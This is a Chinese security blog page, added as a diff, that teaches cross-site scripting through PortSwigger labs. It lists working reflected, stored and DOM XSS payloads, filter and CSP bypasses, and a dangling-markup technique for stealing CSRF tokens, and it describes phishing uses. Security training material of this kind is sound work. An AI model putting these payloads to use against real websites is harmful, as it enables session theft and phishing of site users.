@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            从0到1完全掌握XSS |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">从0到1完全掌握XSS</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-05-05 21:02:23</span>
+        <span class="mobile">2022-05-05 21:02</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-18 17:27:28</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Port/">Port</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>13 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS Payload 大全</a></p>
+<h1 id="从0到1完全掌握-XSS"><a href="#从0到1完全掌握-XSS" class="headerlink" title="从0到1完全掌握 XSS"></a>从0到1完全掌握 XSS</h1><ul>
+<li>文章篇幅较长，建议分块观看学习。<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2></li>
+</ul>
+<p>本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。</p>
+<blockquote>
+<p>XSS 的本质是一种高级钓鱼手法。</p>
+</blockquote>
+<h2 id="0x02-什么是-XSS"><a href="#0x02-什么是-XSS" class="headerlink" title="0x02 什么是 XSS"></a>0x02 什么是 XSS</h2><p>XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是为不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。<br>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许恶意 Web 用户将代码植入到提供给其它用户使用的页面中。</p>
+<ul>
+<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。</li>
+</ul>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/XSSCode.png" class="">
+
+<h2 id="0x03-XSS-的危害"><a href="#0x03-XSS-的危害" class="headerlink" title="0x03 XSS 的危害"></a>0x03 XSS 的危害</h2><p>前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
+<h2 id="0x04-XSS-简单应用场景举例"><a href="#0x04-XSS-简单应用场景举例" class="headerlink" title="0x04 XSS 简单应用场景举例"></a>0x04 XSS 简单应用场景举例</h2><p>这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/ReflectUsePic.png" class="">
+
+<ul>
+<li>这里借用国光师傅的图片进行分析</li>
+</ul>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/QQZoneFish.png" class="">
+
+<p>这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入 <code>username%20&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。</p>
+<h2 id="0x05-XSS-基本攻击手段"><a href="#0x05-XSS-基本攻击手段" class="headerlink" title="0x05 XSS 基本攻击手段"></a>0x05 XSS 基本攻击手段</h2><ul>
+<li>XSS 根据效果不同主要分为三种类型</li>
+<li>反射型 XSS，存储型 XSS，DOM 型 XSS</li>
+</ul>
+<p>危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~&#x3D; DOM 型 XSS<br>我们接下来细讲一下这三种 XSS 的攻击手段。</p>
+<h3 id="1-反射型-XSS-及绕过手段"><a href="#1-反射型-XSS-及绕过手段" class="headerlink" title="1. 反射型 XSS 及绕过手段"></a>1. 反射型 XSS 及绕过手段</h3><h4 id="1-什么是反射型-XSS"><a href="#1-什么是反射型-XSS" class="headerlink" title="(1) 什么是反射型 XSS"></a>(1) 什么是反射型 XSS</h4><p>反射型 XSS，也叫非持久型 XSS，转瞬即逝。</p>
+<p>利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。</p>
+<p>反射型 XSS 的 Payload 如下</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/ReflectEasyXSS.png" class="">
+
+<p>效果如图所示</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/ReflectEasyXSShow.png" class="">
+
+<p>XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
+<h5 id="一、当大多数标签被禁止时的绕过"><a href="#一、当大多数标签被禁止时的绕过" class="headerlink" title="一、当大多数标签被禁止时的绕过"></a>一、当大多数标签被禁止时的绕过</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p>
+</blockquote>
+<p>还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。</p>
+<p>探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onresize<span class="token operator">=</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>" onload<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token string">'100px'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/BlockTags.png" class="">
+
+<h5 id="二、当事件处理器与-href-被禁用时的绕过"><a href="#二、当事件处理器与-href-被禁用时的绕过" class="headerlink" title="二、当事件处理器与 href 被禁用时的绕过"></a>二、当事件处理器与 href 被禁用时的绕过</h5><ul>
+<li>老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，<code>svg</code> 标签的绕过方式还是主流。</li>
+</ul>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></p>
+</blockquote>
+<p>Payload</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>svg<span class="token operator">></span>
+    <span class="token operator">&lt;</span>a<span class="token operator">></span>
+    <span class="token operator">&lt;</span>animate attributeName<span class="token operator">=</span>href
+     values<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span><span class="token operator">></span>
+        <span class="token operator">&lt;</span>text x<span class="token operator">=</span><span class="token number">20</span> y<span class="token operator">=</span><span class="token number">20</span><span class="token operator">></span>Click me<span class="token operator">&lt;</span><span class="token operator">/</span>text<span class="token operator">></span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>还有一些 <code>svg</code> 标签的绕过手段</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>animatetransform onbegin<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="三、对-script-进行闭合后构造-Payload"><a href="#三、对-script-进行闭合后构造-Payload" class="headerlink" title="三、对 script 进行闭合后构造 Payload"></a>三、对 script 进行闭合后构造 Payload</h5><p>对某些语句中的符号进行闭合。<br>有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。</p>
+<ul>
+<li>XSS Insert Into-&gt; JavaScript</li>
+</ul>
+<p>这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用 <code>&lt;script&gt;</code> 标签。</p>
+<p>一般的 Payload</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'-alert(document.domain)-'</span> 
+'<span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>domain<span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h5 id="四、绕过-CSP-攻击"><a href="#四、绕过-CSP-攻击" class="headerlink" title="四、绕过 CSP 攻击"></a>四、绕过 CSP 攻击</h5><ul>
+<li>CSP：content security policy，比较严格的防御 XSS 手段。</li>
+</ul>
+<p>它一般在 HTTP 包里面长这样</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/CSPLike.png" class="">
+
+<p>CSP通过这样的指令限制只能加载与页面本身相同来源的资源  </p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http">script-src 'self'
+```  
+通过下面的指令限制只能从指定域中加载资源  
+```http
+script-src https://scripts.normal-website.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。</p>
+<ul>
+<li>CSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。</li>
+<li>CSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。</li>
+</ul>
+<h6 id="绕过方式一-悬空标记攻击"><a href="#绕过方式一-悬空标记攻击" class="headerlink" title="绕过方式一 悬空标记攻击"></a>绕过方式一 悬空标记攻击</h6><ul>
+<li>这种和闭合语句的攻击差不多。</li>
+</ul>
+<p>虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用 <code>img</code> 标签窃取 CSRF 令牌。</p>
+<p>有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。</p>
+<p>但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</a></p>
+</blockquote>
+<p>首先我们观察一下修改邮箱的表单要提交哪些信息</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/DanglingMarkupSubmitShow.png" class="">
+
+<p>接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload </p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/DanglingMarkupExp.png" class="">
+
+<p>再然后用 CSRF 盗用 token，再发包即可。</p>
+<h6 id="绕过方式二-对-CSP-限制不严格的情况下攻击"><a href="#绕过方式二-对-CSP-限制不严格的情况下攻击" class="headerlink" title="绕过方式二  对 CSP 限制不严格的情况下攻击"></a>绕过方式二  对 CSP 限制不严格的情况下攻击</h6><ul>
+<li>CSP 是有设置的，若 <code>base-url</code> 为空的话，可以通过 token 值来添加新的 CSP 指令。</li>
+</ul>
+<p>Payload</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&amp;</span>token<span class="token operator">=</span><span class="token punctuation">;</span>script<span class="token operator">-</span>src<span class="token operator">-</span>elem <span class="token string">'unsafe-inline'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们使用 <code>script-src-elem</code> 对 CSP 进行覆盖，从而进行 XSS 攻击。</p>
+<h3 id="2-存储型-XSS"><a href="#2-存储型-XSS" class="headerlink" title="2. 存储型 XSS"></a>2. 存储型 XSS</h3><p>存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/StoredXSS.png" class="">
+
+<ul>
+<li>如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。</li>
+</ul>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/StoredXSSCode.png" class="">
+
+<p>我们在新增的评论中将 username 构造成 Payload</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。</p>
+<ul>
+<li>绕过手段不再逼逼，和反射型 XSS 是异曲同工。</li>
+</ul>
+<h3 id="3-DOM-型-XSS-重点"><a href="#3-DOM-型-XSS-重点" class="headerlink" title="3. DOM 型 XSS(重点!)"></a>3. DOM 型 XSS(重点!)</h3><p>DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如 <code>img</code>，<code>input</code> 等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。</p>
+<blockquote>
+<p>我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。</p>
+</blockquote>
+<p>DOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。</p>
+<ul>
+<li>我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1838791">HACK 师傅的文章</a></li>
+</ul>
+<h4 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><strong>一些常用的标签与属性</strong></h4><p>下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p>
+<h5 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><strong>scirpt 标签</strong></h5><p><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><strong>img 标签</strong></h5><p><code>&lt;img&gt;</code> 标签定义 HTML 页面中的图像。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><strong>input 标签</strong></h5><p><code>&lt;input&gt;</code> 标签规定了用户可以在其中输入数据的输入字段。<br>onfocus 事件在对象获得焦点时发生：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>竞争焦点，从而触发 onblur 事件：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input onblur<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> autofocus<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>input 标签的 autofocus 属性规定当页面加载时 <code>&lt;input&gt;</code> 元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token string">"alert(1);"</span> autofocus<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><strong>details 标签</strong></h5><p><code>&lt;details&gt;</code> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <code>&lt;details&gt;</code> 元素时触发：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>details ontoggle<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>details open ontoggle<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><strong>svg 标签</strong></h5><p><code>&lt;svg&gt;</code> 标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><strong>select 标签</strong></h5><p><code>&lt;select&gt;</code> 标签用来创建下拉列表。</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>select onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>select onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> autofocus<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><strong>iframe 标签</strong></h5><p><code>&lt;iframe&gt;</code> 标签会创建包含另外一个文档的内联框架。</p>
